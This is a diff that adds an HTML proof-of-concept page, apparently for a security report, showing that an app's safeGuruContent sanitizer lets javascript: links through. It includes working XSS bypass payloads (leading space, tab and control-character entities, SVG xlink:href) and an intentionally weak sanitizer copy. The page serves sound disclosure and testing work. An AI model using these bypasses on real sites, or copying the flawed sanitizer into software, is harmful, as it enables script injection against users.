@@ -1,0 +1,57 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Guru sanitizer XSS repro</title></head>
+<body>
+<h1>safeGuruContent bypass repro</h1>
+<pre id="log"></pre>
+<div id="sink"></div>
+<script>
+  var log = function (m) { document.getElementById("log").textContent += m + "\n"; };
+  window.__xss = [];
+
+  // ---- exact copy of safeGuruContent from app.js:2263-2270 ----
+  function safeGuruContent(html) {
+    var d = document.createElement("div"); d.innerHTML = String(html || "");
+    Array.prototype.forEach.call(d.querySelectorAll("script,style,iframe,object,embed,link"), function (n) { n.parentNode && n.parentNode.removeChild(n); });
+    Array.prototype.forEach.call(d.querySelectorAll("*"), function (n) {
+      Array.prototype.slice.call(n.attributes).forEach(function (a) { if (/^on/i.test(a.name) || (a.name === "href" && /^javascript:/i.test(a.value))) n.removeAttribute(a.name); });
+    });
+    return d.innerHTML;
+  }
+
+  // ---- hostile Guru card bodies (what a compromised/malicious card would contain) ----
+  var payloads = {
+    "leading-space href":  '<a id="p1" href=" javascript:window.__xss.push(\'p1\')">click</a>',
+    "tab entity href":     '<a id="p2" href="&#9;javascript:window.__xss.push(\'p2\')">click</a>',
+    "C0 control href":     '<a id="p3" href="&#1;javascript:window.__xss.push(\'p3\')">click</a>',
+    "svg xlink:href":      '<svg><a id="p4" xlink:href="javascript:window.__xss.push(\'p4\')"><text>click</text></a></svg>',
+    "plain (control)":     '<a id="p5" href="javascript:window.__xss.push(\'p5\')">click</a>'
+  };
+
+  var sink = document.getElementById("sink");
+  Object.keys(payloads).forEach(function (name) {
+    var sanitized = safeGuruContent(payloads[name]);
+    var wrap = document.createElement("div");
+    wrap.innerHTML = sanitized;   // renders in-document, same as guru-overlay-body innerHTML
+    sink.appendChild(wrap);
+    // report whether the href attribute survived sanitization
+    var a = wrap.querySelector("a");
+    var hrefAttr = a ? (a.getAttribute("href") || a.getAttribute("xlink:href")) : "(no anchor)";
+    log(name + " => survived href = " + JSON.stringify(hrefAttr));
+  });
+
+  // Now click each surviving link and see what executes.
+  window.__runClicks = function () {
+    window.__xss = [];
+    ["p1","p2","p3","p4","p5"].forEach(function (id) {
+      var el = document.getElementById(id);
+      if (el) { try { el.click(); } catch (e) {} }
+    });
+    setTimeout(function () {
+      log("EXECUTED payloads: " + JSON.stringify(window.__xss));
+      window.__done = true;
+    }, 50);
+  };
+</script>
+</body>
+</html>
